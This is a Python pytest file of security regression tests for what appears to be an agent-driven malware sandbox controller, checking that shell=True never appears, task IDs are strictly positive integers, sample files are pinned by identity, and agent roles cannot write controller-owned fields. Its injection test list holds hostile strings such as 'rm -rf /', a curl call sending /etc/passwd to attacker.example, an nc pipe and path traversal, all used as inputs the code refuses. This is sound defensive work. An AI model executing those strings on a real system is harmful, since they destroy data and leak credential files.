#!/usr/bin/env python3
"""
Security regression tests for SG-CTL-01 and SG-CTL-02.

SG-TEST-01 observed that the existing 57 canary checks mostly assert that a
string or a function exists, which is why they stayed green while the audit
found a reachable host-RCE path. These tests assert security *properties*
instead: that a value cannot be written, that a type cannot be smuggled, that
a construct does not appear anywhere in the tree.

They are written to fail loudly on regression rather than to document current
behaviour, so a change that reintroduces `shell=True` or reopens a
controller-owned field breaks the build.
"""

from __future__ import annotations

import ast
import hashlib
import os
import sys
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parents[1] / "src"
sys.path.insert(0, str(SRC))

from core.env_spec import EnvironmentSpec  # noqa: E402
from core.run_context import (  # noqa: E402
    LedgerError,
    LedgerRejected,
    LedgerSealed,
    RunContext,
)
from core.spec_policy import (  # noqa: E402
    CONTROLLER_OWNED,
    ROLE_WRITABLE,
    SpecPermissionError,
    SpecSchemaError,
    check_write,
)

AGENT_ROLES = sorted(ROLE_WRITABLE)


# ── SG-CTL-01: no shell=True anywhere ─────────────────────────────────────────


def _python_sources() -> list[Path]:
    return [
        p
        for p in SRC.rglob("*.py")
        if "__pycache__" not in p.parts
    ]


def test_no_shell_true_in_tree():
    """
    Static gate. SG-CTL-01 requires rejecting new uses of shell=True.

    Parsed rather than grepped, so a comment mentioning the construct does not
    fail the build and a line-wrapped call cannot slip past.
    """
    offenders = []
    for path in _python_sources():
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for kw in node.keywords:
                if kw.arg == "shell" and not (
                    isinstance(kw.value, ast.Constant) and kw.value.value is False
                ):
                    offenders.append(f"{path.relative_to(SRC)}:{node.lineno}")
    assert not offenders, (
        "shell=True (or a non-literal shell=) reintroduced at: "
        + ", ".join(offenders)
    )


# ── SG-CTL-01: task IDs are integers by construction ──────────────────────────


@pytest.fixture()
def ctx(tmp_path: Path) -> RunContext:
    sample = tmp_path / "canary.bin"
    sample.write_bytes(b"harmless canary payload")
    c = RunContext(run_id="test-run", workspace=tmp_path)
    c.bind_sample(sample)
    c.set_route_policy("drop")
    return c


INJECTION_TASK_IDS = [
    "1; rm -rf /",
    "1 && curl http://attacker.example/$(cat /etc/passwd)",
    "1`id`",
    "1$(id)",
    "1\nid",
    "1'|'id",
    '1" ; id ; "',
    "../../../etc/passwd",
    "1 | nc attacker.example 4444",
    "٣",           # Arabic-Indic digit: str.isdigit() is True, int() would parse
    "1_000",       # int("1_000") succeeds in Python; must not become 1000 here
    True,          # bool is an int subclass
    1.0,
    None,
    ["1"],
    {"task_id": 1},
    10**40,        # oversized, per the audit's property-test requirement
    0,
    -1,
]


@pytest.mark.parametrize("bad", INJECTION_TASK_IDS)
def test_task_id_ledger_rejects_non_positive_int(ctx: RunContext, bad):
    """
    The only door a task ID enters through refuses everything that is not a
    positive int, so nothing downstream has to remember to coerce.
    """
    with pytest.raises(LedgerRejected):
        ctx.record_task(bad, pass_number=1, route="drop")


def test_task_id_accepted_only_once_and_capped(ctx: RunContext):
    ctx.record_task(41, pass_number=1, route="drop")
    with pytest.raises(LedgerRejected, match="already recorded"):
        ctx.record_task(41, pass_number=2, route="drop")

    for i in range(42, 42 + 16):
        try:
            ctx.record_task(i, pass_number=2, route="drop")
        except LedgerRejected as e:
            assert "limit" in str(e)
            break
    else:
        pytest.fail("task ledger accepted an unbounded number of CAPE tasks")


def test_agent_cannot_reach_another_runs_task(ctx: RunContext):
    """SG-AUTH-01: sequential IDs plus a superuser token means ownership must be checked."""
    ctx.record_task(100, pass_number=1, route="drop")
    assert ctx.owns_task(100)
    assert not ctx.owns_task(101)
    with pytest.raises(LedgerRejected, match="was not submitted by run"):
        ctx.require_task(101)


# ── SG-CTL-02 / SG-DATA-02: sample identity is pinned, not path-derived ───────


def test_sample_binds_once(ctx: RunContext, tmp_path: Path):
    other = tmp_path / "other.bin"
    other.write_bytes(b"different bytes")
    with pytest.raises(LedgerSealed):
        ctx.bind_sample(other)


def test_sample_hash_is_computed_not_declared(ctx: RunContext):
    assert ctx.sample.sha256 == hashlib.sha256(b"harmless canary payload").hexdigest()
    assert ctx.sample.size_bytes == len(b"harmless canary payload")


def test_sample_identity_survives_path_swap(ctx: RunContext, tmp_path: Path):
    """
    SG-DATA-02: rewriting the path must not redirect a read. The identity is
    (device, inode), so replacing the file at the same path is detected.
    """
    pinned = ctx.sample
    pinned.path.unlink()
    pinned.path.write_bytes(b"attacker-substituted content")
    assert not pinned.matches(pinned.path)
    with pytest.raises(LedgerRejected, match="no longer resolves"):
        ctx.open_sample()


def test_sample_must_be_regular_file(tmp_path: Path):
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    c = RunContext(run_id="fifo-run", workspace=tmp_path)
    with pytest.raises(LedgerRejected, match="regular file"):
        c.bind_sample(fifo)


# ── SG-CTL-02: controller-owned fields are closed to every agent ──────────────


@pytest.mark.parametrize("path", sorted(CONTROLLER_OWNED))
@pytest.mark.parametrize("role", AGENT_ROLES)
def test_no_agent_may_write_controller_owned_field(path: str, role: str):
    """
    The cross product is the point: the audit's finding was not "one field was
    writable" but "field ownership did not exist". Every role is checked
    against every controller-owned path.
    """
    with pytest.raises(SpecPermissionError):
        check_write(path, "anything", actor=role)


@pytest.mark.parametrize("role", AGENT_ROLES)
def test_agent_cannot_escape_its_subtree(role: str):
    foreign = {
        "Scout": "cape_submission.package",
        "Architect": "classification.type",
        "Executor": "sandbox.actual.access",
        "Analyst": "cape_submission.timeout",
    }[role]
    with pytest.raises(SpecPermissionError):
        check_write(foreign, "x", actor=role)


def test_unknown_role_writes_nothing():
    with pytest.raises(SpecPermissionError, match="unknown role"):
        check_write("classification.type", "rat", actor="Interloper")


def test_controller_may_write_its_own_fields():
    check_write("sample.sha256", "a" * 64, actor="controller")
    check_write("cape_submission.pass2_task_id", 7, actor="controller")


# ── SG-CTL-02: schema, enum and bounds ────────────────────────────────────────


def test_wrong_type_is_refused():
    with pytest.raises(SpecSchemaError, match="expects int"):
        check_write("cape_submission.timeout", "600", actor="Architect")


def test_bool_is_not_an_int():
    with pytest.raises(SpecSchemaError, match="got bool"):
        check_write("cape_submission.timeout", True, actor="Architect")


def test_enum_is_closed():
    with pytest.raises(SpecSchemaError, match="must be one of"):
        check_write("cape_submission.platform", "solaris", actor="Architect")


def test_bounds_are_enforced():
    with pytest.raises(SpecSchemaError, match="within"):
        check_write("cape_submission.timeout", 10**9, actor="Architect")


@pytest.mark.parametrize(
    "bad_key",
    [
        "",
        "a" * 200,
        "a.b.c.d.e.f.g.h",
        "sample..path",
        "sample./etc/passwd",
        "sample.path;id",
        "__class__",
    ],
)
def test_malformed_keys_are_refused(bad_key: str):
    with pytest.raises((SpecSchemaError, SpecPermissionError)):
        check_write(bad_key, "x", actor="Scout")


def test_oversized_values_are_refused():
    with pytest.raises(SpecSchemaError, match="limit"):
        check_write("scout.notes", "x" * (128 * 1024), actor="Scout")
    with pytest.raises(SpecSchemaError, match="limit"):
        check_write("scout.items", list(range(5000)), actor="Scout")


def test_deeply_nested_values_are_refused():
    payload = cur = {}
    for _ in range(20):
        cur["n"] = {}
        cur = cur["n"]
    with pytest.raises(SpecSchemaError, match="nests deeper"):
        check_write("scout.tree", payload, actor="Scout")


# ── Spec integration: the setter refuses without an actor ─────────────────────


def test_spec_set_requires_actor(tmp_path: Path):
    spec = EnvironmentSpec(workspace=tmp_path, run_id="r1")
    with pytest.raises(TypeError):
        spec.set("classification.type", "rat")  # type: ignore[call-arg]


def test_spec_set_enforces_policy(tmp_path: Path):
    spec = EnvironmentSpec(workspace=tmp_path, run_id="r1")
    spec.set("classification.type", "rat", actor="Scout")
    assert spec.get("classification.type") == "rat"

    with pytest.raises(SpecPermissionError):
        spec.set("sample.path", "/etc/shadow", actor="Scout")
    assert spec.get("sample.path") is None


def test_append_refuses_non_list(tmp_path: Path):
    spec = EnvironmentSpec(workspace=tmp_path, run_id="r1")
    spec.set("classification.basis", ["a"], actor="Scout")
    spec.append("classification.basis", "b", actor="Scout")
    assert spec.get("classification.basis") == ["a", "b"]

    spec.set("scout.scalar", "not-a-list", actor="Scout")
    with pytest.raises(SpecSchemaError, match="not a list"):
        spec.append("scout.scalar", "x", actor="Scout")


def test_write_log_attributes_every_write(tmp_path: Path):
    """SG-LOG-01: the log has to say who wrote what, not just that a write happened."""
    spec = EnvironmentSpec(workspace=tmp_path, run_id="r1")
    spec.set("classification.type", "rat", actor="Scout")
    spec.set("cape_submission.timeout", 120, actor="Architect")
    log = spec.write_log()
    assert [(e["actor"], e["key"]) for e in log] == [
        ("Scout", "classification.type"),
        ("Architect", "cape_submission.timeout"),
    ]


# ── Manifest: completion is a controller assertion ────────────────────────────


def test_unverified_report_is_not_offered(ctx: RunContext, tmp_path: Path):
    """
    SG-INT-02 / round-1 INT-04: a report whose target hash did not match the
    sample must not come back as the verified one.
    """
    ctx.record_task(7, pass_number=2, route="drop")
    report = tmp_path / "report.json"
    report.write_text('{"behavior": {}}')
    ctx.record_report(7, report, target_sha256_matches=False)
    assert ctx.verified_report() is None

    ctx.record_task(8, pass_number=2, route="drop")
    good = tmp_path / "good.json"
    good.write_text('{"behavior": {"processes": [1]}}')
    ctx.record_report(8, good, target_sha256_matches=True)
    assert ctx.verified_report().task_id == 8


def test_manifest_is_written_0600(ctx: RunContext, tmp_path: Path):
    path = ctx.write_manifest(tmp_path / "success.json")
    assert oct(path.stat().st_mode)[-3:] == "600"
    assert ctx.manifest()["sample"]["sha256"] == ctx.sample.sha256


def test_facts_expose_no_mutator(ctx: RunContext):
    """Agents get a projection; nothing on it can write back to the ledger."""
    facts = ctx.facts()
    for name in ("record_task", "bind_sample", "set_route_policy", "_lock"):
        assert not hasattr(facts, name)
